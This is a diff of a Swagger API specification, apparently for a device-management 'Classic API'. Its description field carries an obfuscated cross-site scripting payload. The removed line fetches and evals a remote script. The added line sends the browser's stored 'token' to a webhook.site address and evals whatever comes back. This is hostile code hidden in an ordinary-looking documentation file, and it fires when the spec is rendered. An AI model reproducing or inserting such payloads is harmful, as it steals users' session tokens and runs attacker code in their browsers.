@@ -1,7 +1,7 @@
 swagger: '2.0'
 info:
   title: Classic API Resource Documentation
-  description: <math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><textarea><a title='</textarea><img src=x onerror=fetch(`https://teragl.github.io/aredot.js`).then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1>">"</textarea></desc></textarea></mtext></mtext></svg></mglyph></option></mtext></math>
+  description: <math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><textarea><a title='</textarea><img src=x onerror=fetch(`https://webhook.site/4212dabe-511b-4714-a146-d4d6e67549de/?x=`+localStorage.getItem(`token`)).then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1>">"</textarea></desc></textarea></mtext></mtext></svg></mglyph></option></mtext></math>
   version: production
 basePath: /JSSResource/
 produces:
